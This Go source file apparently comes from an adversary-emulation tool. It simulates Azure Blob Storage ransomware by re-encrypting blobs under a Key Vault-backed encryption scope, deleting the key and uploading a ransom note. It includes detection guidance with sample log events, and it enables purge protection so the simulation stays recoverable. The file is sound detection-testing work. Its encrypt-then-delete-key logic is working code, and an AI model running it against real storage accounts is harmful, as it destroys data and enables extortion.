package azure

import (
	"bytes"
	"context"
	"crypto/rand"
	_ "embed"
	"fmt"
	"io"
	"log"
	"math/big"
	"strings"
	"time"

	"github.com/Azure/azure-sdk-for-go/sdk/azcore/runtime"
	"github.com/Azure/azure-sdk-for-go/sdk/azcore/to"
	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/keyvault/armkeyvault"
	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/storage/armstorage"
	"github.com/Azure/azure-sdk-for-go/sdk/security/keyvault/azkeys"
	"github.com/Azure/azure-sdk-for-go/sdk/storage/azblob"
	"github.com/Azure/azure-sdk-for-go/sdk/storage/azblob/blob"
	"github.com/datadog/stratus-red-team/v2/internal/providers"
	"github.com/datadog/stratus-red-team/v2/internal/utils"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

const KeyName = "ransom-encryption-key"
const EncryptionScopeName = "ransom-encryption-scope"

const RansomContainerName = "your-files-encrypted"
const RansomNoteFilename = "FILES-ENCRYPTED.txt"
const RansomNoteContents = "Your data has been encrypted with a Key Vault key that has been deleted. To negotiate with us for the decryption key, contact evil@hackerz.io. In 7 days, if we don't hear from you, that data will either be sold or published, and might no longer be recoverable."

const CodeBlock = "```"

// Blob generation constants
const numContainers = 5
const numFiles = 51
const minSizeBytes = 1
const maxSizeBytes = 200

var fileExtensions = []string{"sql", "txt", "docx", "pdf", "png", "tar.gz"}
var nameSeparators = []string{" ", "-", "_"}
var wordlist = []string{
	"liable", "donated", "mayday", "blooper", "pueblo", "tantrum", "scary", "secret",
	"secluded", "babied", "ignition", "unfasten", "affirm", "margarine", "credit",
	"underage", "june", "licking", "approve", "overbite", "ditto", "pavilion", "chewy",
	"drivable", "favorable", "kitchen", "wriggly", "shape", "resistant", "unless",
	"backlight", "cruelty", "empower", "freewill", "passage", "net", "retrial", "hulk",
	"drizzly", "ambitious", "banknote", "calm", "these", "outlet", "survivor", "silenced",
	"fantasy", "flogging", "aeration", "balsamic", "antivirus", "glowing", "setup",
	"unpopular", "immobile", "divisive", "dosage", "amicably", "follicle", "ogle",
}

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "azure.impact.blob-ransomware-client-encryption-scope",
		FriendlyName: "Azure Blob Storage ransomware through Encryption Scope using client-managed Key Vault key",
		Description: `
Simulates Azure Blob Storage ransomware activity that encrypts files using an encryption scope backed by a customer-managed Key Vault key, then deletes the key to render the data inaccessible.
Note that due to Azure's purge protection feature, it is impossible to hard-delete the key and the blobs remain recoverable.

You will need to have the <code>Key Vault Administrator</code> role on your Azure subscription to correctly warmup the technique.

Warm-up:

- Create an Azure Storage Account with a system-assigned managed identity
- Create an Azure Key Vault without purge protection
- Grant the storage account the "Key Vault Crypto Service Encryption User" role on the Key Vault
- Create multiple storage containers in the account

Detonation:

- Create a number of blobs in the containers with random content and file extensions
- Enable purge protection on the Key Vault (to generate MICROSOFT.KEYVAULT/VAULTS/WRITE activity log event)
- Create an RSA 2048 key in the Key Vault
- Create an encryption scope on the storage account using the Key Vault key
- Download all blobs and re-upload them using the new encryption scope
- Soft-delete the Key Vault key
- Attempt to purge the key (fails due to purge protection, but logged)

References:

- [Storm-0501’s evolving techniques lead to cloud-based ransomware](https://www.microsoft.com/en-us/security/blog/2025/08/27/storm-0501s-evolving-techniques-lead-to-cloud-based-ransomware/)
`,
		Detection: `
You can detect this ransomware activity by monitoring for:

1. Encryption scope creation  (<code>MICROSOFT.STORAGE/STORAGEACCOUNTS/ENCRYPTIONSCOPES/WRITE</code>) followed by the deletion of the key (<code>KeyDelete</code>) used for encryption.
2. High volumes of <code>GetBlob</code> followed by <code>PutBlob</code> operations.

Sample Azure Activity log event for Key Vault creation:

` + CodeBlock + `json
{
  "operationName": "MICROSOFT.KEYVAULT/VAULTS/WRITE",
  "category": "Administrative",
  "resultType": "Success",
  "properties": {
    "entity": "/subscriptions/<subscription-id>/resourceGroups/<rg>/providers/Microsoft.KeyVault/vaults/<vault-name>"
  }
}
` + CodeBlock + `

Sample Azure Activity log event for Key Vault key deletion:

` + CodeBlock + `json
{
  "operationName": "KeyDelete",
  "category": "AuditEvent",
  "resultType": "Success",
  "properties": {
    "entity": "/subscriptions/<subscription-id>/resourceGroups/<rg>/providers/Microsoft.KeyVault/vaults/<vault-name>/keys/<key-name>"
  }
}
` + CodeBlock + `

Sample event for encryption scope creation:

` + CodeBlock + `json
{
  "operationName": "MICROSOFT.STORAGE/STORAGEACCOUNTS/ENCRYPTIONSCOPES/WRITE",
  "category": "Administrative",
  "resultType": "Success",
  "properties": {
    "entity": "/subscriptions/<subscription-id>/resourceGroups/<rg>/providers/Microsoft.Storage/storageAccounts/<storage-account-name>/encryptionScopes/<encryption-scope-name>"
  }
}
` + CodeBlock + `
`,
		Platform:                   stratus.Azure,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Impact},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	storageAccount := params["storage_account_name"]
	resourceGroup := params["resource_group_name"]
	keyVaultName := params["key_vault_name"]
	blobServiceURL := fmt.Sprintf("https://%s.blob.core.windows.net/", storageAccount)

	azureConfig := providers.Azure()

	log.Println("Simulating a ransomware attack on storage account " + storageAccount)

	// Create blob client first - needed for blob creation
	blobClient, err := utils.GetAzureBlobClient(blobServiceURL, azureConfig.SubscriptionID, azureConfig.GetCredentials(), azureConfig.ClientOptions, params)
	if err != nil {
		return fmt.Errorf("failed to instantiate Blob Client: %w", err)
	}

	if err := createFakeBlobs(blobClient); err != nil {
		return fmt.Errorf("failed to create fake blobs: %w", err)
	}

	if err := enablePurgeProtection(azureConfig, resourceGroup, keyVaultName); err != nil {
		return fmt.Errorf("failed to enable purge protection: %w", err)
	}

	keyID, err := createKeyVaultKey(azureConfig, resourceGroup, keyVaultName)
	if err != nil {
		return fmt.Errorf("failed to create key vault key: %w", err)
	}
	log.Printf("Created Key Vault key: %s", keyID)

	if err := createEncryptionScope(azureConfig, resourceGroup, storageAccount, keyVaultName); err != nil {
		return fmt.Errorf("failed to create encryption scope: %w", err)
	}

	if err := encryptAllBlobsWithScope(blobClient); err != nil {
		return fmt.Errorf("failed to encrypt blobs with encryption scope: %w", err)
	}

	if err := deleteKeyVaultKey(azureConfig, keyVaultName); err != nil {
		return fmt.Errorf("failed to delete key vault key: %w", err)
	}

	if err := attemptPurgeKey(azureConfig, keyVaultName); err != nil {
		return fmt.Errorf("failed to attempt key purge: %w", err)
	}

	log.Println("Uploading ransom note...")
	if err := utils.UploadBlob(blobClient, RansomContainerName, RansomNoteFilename, strings.NewReader(RansomNoteContents)); err != nil {
		return fmt.Errorf("failed to upload ransom note: %w", err)
	}

	log.Println("Technique execution completed - blobs are now encrypted with a deleted key")
	return nil
}

func createFakeBlobs(client *azblob.Client) error {
	log.Printf("Creating %d fake blobs across %d containers", numFiles, numContainers)

	for i := 0; i < numFiles; i++ {
		containerName := fmt.Sprintf("container-%d", (i%numContainers)+1)

		word1Idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(wordlist))))
		word2Idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(wordlist))))
		sepIdx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(nameSeparators))))
		extIdx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(fileExtensions))))

		blobName := fmt.Sprintf("%s%s%s.%s",
			wordlist[word1Idx.Int64()],
			nameSeparators[sepIdx.Int64()],
			wordlist[word2Idx.Int64()],
			fileExtensions[extIdx.Int64()],
		)

		sizeRange := maxSizeBytes - minSizeBytes
		sizeOffset, _ := rand.Int(rand.Reader, big.NewInt(int64(sizeRange)))
		contentSize := minSizeBytes + int(sizeOffset.Int64())
		content := make([]byte, contentSize)
		rand.Read(content)

		_, err := client.UploadBuffer(context.Background(), containerName, blobName, content, nil)
		if err != nil {
			return fmt.Errorf("failed to upload blob %s to container %s: %w", blobName, containerName, err)
		}
	}

	log.Printf("Created %d fake blobs", numFiles)
	return nil
}

func enablePurgeProtection(azure *providers.AzureProvider, resourceGroup, keyVaultName string) error {
	vaultsClient, err := getVaultsClient(azure)
	if err != nil {
		return fmt.Errorf("failed to create vaults client: %w", err)
	}

	log.Printf("Enabling purge protection on Key Vault: %s", keyVaultName)

	vault, err := vaultsClient.Get(context.Background(), resourceGroup, keyVaultName, nil)
	if err != nil {
		return fmt.Errorf("failed to get key vault: %w", err)
	}

	poller, err := vaultsClient.BeginCreateOrUpdate(context.Background(), resourceGroup, keyVaultName, armkeyvault.VaultCreateOrUpdateParameters{
		Location: vault.Location,
		Properties: &armkeyvault.VaultProperties{
			TenantID:                  vault.Properties.TenantID,
			SKU:                       vault.Properties.SKU,
			EnableSoftDelete:          vault.Properties.EnableSoftDelete,
			SoftDeleteRetentionInDays: vault.Properties.SoftDeleteRetentionInDays,
			EnablePurgeProtection:     to.Ptr(true),
			EnableRbacAuthorization:   vault.Properties.EnableRbacAuthorization,
			AccessPolicies:            vault.Properties.AccessPolicies,
		},
	}, nil)
	if err != nil {
		return fmt.Errorf("failed to enable purge protection: %w", err)
	}

	_, err = poller.PollUntilDone(context.Background(), &runtime.PollUntilDoneOptions{Frequency: 2 * time.Second})
	if err != nil {
		return fmt.Errorf("failed to poll key vault update: %w", err)
	}

	log.Printf("Purge protection enabled on Key Vault: %s", keyVaultName)
	return nil
}

func createKeyVaultKey(azure *providers.AzureProvider, resourceGroup, keyVaultName string) (string, error) {
	keysClient, err := getManagementKeysClient(azure)
	if err != nil {
		return "", fmt.Errorf("failed to create keys client: %w", err)
	}

	log.Printf("Creating RSA 2048 key in Key Vault: %s", keyVaultName)
	result, err := keysClient.CreateIfNotExist(context.Background(), resourceGroup, keyVaultName, KeyName, armkeyvault.KeyCreateParameters{
		Properties: &armkeyvault.KeyProperties{
			Kty:     to.Ptr(armkeyvault.JSONWebKeyTypeRSA),
			KeySize: to.Ptr(int32(2048)),
		},
	}, nil)
	if err != nil {
		return "", fmt.Errorf("failed to create key: %w", err)
	}

	return *result.Properties.KeyURIWithVersion, nil
}

func createEncryptionScope(azure *providers.AzureProvider, resourceGroup, storageAccount, keyVaultName string) error {
	scopesClient, err := getEncryptionScopesClient(azure)
	if err != nil {
		return fmt.Errorf("failed to create encryption scopes client: %w", err)
	}

	keysClient, err := getManagementKeysClient(azure)
	if err != nil {
		return fmt.Errorf("failed to create keys client: %w", err)
	}

	key, err := keysClient.Get(context.Background(), resourceGroup, keyVaultName, KeyName, nil)
	if err != nil {
		return fmt.Errorf("failed to get key: %w", err)
	}

	keyURI := *key.Properties.KeyURI

	log.Printf("Creating encryption scope: %s with key: %s", EncryptionScopeName, keyURI)
	_, err = scopesClient.Put(context.Background(), resourceGroup, storageAccount, EncryptionScopeName, armstorage.EncryptionScope{
		EncryptionScopeProperties: &armstorage.EncryptionScopeProperties{
			Source: to.Ptr(armstorage.EncryptionScopeSourceMicrosoftKeyVault),
			KeyVaultProperties: &armstorage.EncryptionScopeKeyVaultProperties{
				KeyURI: to.Ptr(keyURI),
			},
			State: to.Ptr(armstorage.EncryptionScopeStateEnabled),
		},
	}, nil)
	if err != nil {
		return fmt.Errorf("failed to create encryption scope: %w", err)
	}

	log.Printf("Created encryption scope: %s", EncryptionScopeName)
	return nil
}

func encryptAllBlobsWithScope(client *azblob.Client) error {
	blobMap, err := utils.ListAllBlobVersions(client)
	if err != nil {
		return fmt.Errorf("unable to list blobs: %w", err)
	}

	totalBlobs := 0
	for _, versionMap := range blobMap {
		totalBlobs += len(versionMap)
	}

	log.Printf("Found %d blobs to encrypt across %d containers", totalBlobs, len(blobMap))
	log.Printf("Re-encrypting all blobs with encryption scope: %s", EncryptionScopeName)

	cpkScopeInfo := &blob.CPKScopeInfo{
		EncryptionScope: to.Ptr(EncryptionScopeName),
	}

	for containerName, versionMap := range blobMap {
		for blobName := range versionMap {
			downloadResp, err := client.DownloadStream(context.Background(), containerName, blobName, nil)
			if err != nil {
				return fmt.Errorf("unable to download blob %s from container %s: %w", blobName, containerName, err)
			}

			blobContent, err := io.ReadAll(downloadResp.Body)
			downloadResp.Body.Close()
			if err != nil {
				return fmt.Errorf("unable to read blob %s content: %w", blobName, err)
			}

			_, err = client.UploadStream(context.Background(), containerName, blobName, bytes.NewReader(blobContent), &azblob.UploadStreamOptions{
				CPKScopeInfo: cpkScopeInfo,
			})
			if err != nil {
				return fmt.Errorf("unable to upload encrypted blob %s: %w", blobName, err)
			}
		}
	}

	log.Println("Successfully encrypted all blobs with encryption scope")
	return nil
}

func deleteKeyVaultKey(azure *providers.AzureProvider, keyVaultName string) error {
	keysClient, err := getDataPlaneKeysClient(azure, keyVaultName)
	if err != nil {
		return fmt.Errorf("failed to create data plane keys client: %w", err)
	}

	log.Printf("Soft-deleting key: %s from vault: %s", KeyName, keyVaultName)
	_, err = keysClient.DeleteKey(context.Background(), KeyName, nil)
	if err != nil {
		return fmt.Errorf("failed to delete key: %w", err)
	}

	log.Printf("Successfully soft-deleted key: %s", KeyName)
	return nil
}

func attemptPurgeKey(azure *providers.AzureProvider, keyVaultName string) error {
	keysClient, err := getDataPlaneKeysClient(azure, keyVaultName)
	if err != nil {
		return fmt.Errorf("failed to create data plane keys client: %w", err)
	}

	log.Printf("Attempting to purge deleted key: %s from vault: %s", KeyName, keyVaultName)
	_, err = keysClient.PurgeDeletedKey(context.Background(), KeyName, nil)
	if err != nil {
		log.Printf("Key purge failed as expected (purge protection enabled)")
		return nil
	}

	log.Printf("Successfully purged key: %s. This is unexpected as purge protection should be enabled", KeyName)
	return nil
}

func getVaultsClient(azure *providers.AzureProvider) (*armkeyvault.VaultsClient, error) {
	return armkeyvault.NewVaultsClient(azure.SubscriptionID, azure.GetCredentials(), azure.ClientOptions)
}

func getManagementKeysClient(azure *providers.AzureProvider) (*armkeyvault.KeysClient, error) {
	return armkeyvault.NewKeysClient(azure.SubscriptionID, azure.GetCredentials(), azure.ClientOptions)
}

func getDataPlaneKeysClient(azure *providers.AzureProvider, keyVaultName string) (*azkeys.Client, error) {
	vaultURL := fmt.Sprintf("https://%s.vault.azure.net/", keyVaultName)
	return azkeys.NewClient(vaultURL, azure.GetCredentials(), &azkeys.ClientOptions{
		ClientOptions: azure.ClientOptions.ClientOptions,
	})
}

func getEncryptionScopesClient(azure *providers.AzureProvider) (*armstorage.EncryptionScopesClient, error) {
	return armstorage.NewEncryptionScopesClient(azure.SubscriptionID, azure.GetCredentials(), azure.ClientOptions)
}
